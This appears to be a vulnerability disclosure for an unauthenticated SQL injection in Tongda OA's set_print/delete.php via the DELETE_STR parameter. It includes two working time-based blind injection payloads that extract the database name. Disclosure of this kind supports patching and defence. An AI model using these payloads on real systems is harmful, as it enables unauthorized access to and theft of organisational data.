Unauthorized SQL injection vulnerability exists in Tongda OA

version:v2017 and versions below v11.10

Routing: general/system/approve_center/flow_guide/flow_type/set_print/delete.php

There is an injected parameter: $DELETE_STR

The code here is very concise. When $DELETE_STR is not empty, the parameters are directly spliced ​​into the SQL statement. Since the parentheses are closed here, there is a bypass.
![图片1](https://github.com/RCEraser/cve/assets/131632691/5ecfdddf-10f1-4830-bff2-5a829c449fcd)

We can use Cartesian product blind injection for injection. The following payload can determine that the first character of the database name is t, because it was successfully delayed at 116. The ASCII code 116 also corresponds to the lowercase letter t. By analogy, the database name and any information about the database can be obtained through blind injection.
POC
```
1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)% 20and(1)=(1
```
![图片2](https://github.com/RCEraser/cve/assets/131632691/a1a25a4b-fd0b-483b-bbd7-1a34b5e14c68)

And when we change 116 to 115, there will be no delay, indicating the existence of SQL injection.

POC
```
1)%20and%20(substr(DATABASE(),1,1))=char(115)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```
![图片3](https://github.com/RCEraser/cve/assets/131632691/bdd74f71-91a0-426b-b4b9-fae20f173d24)
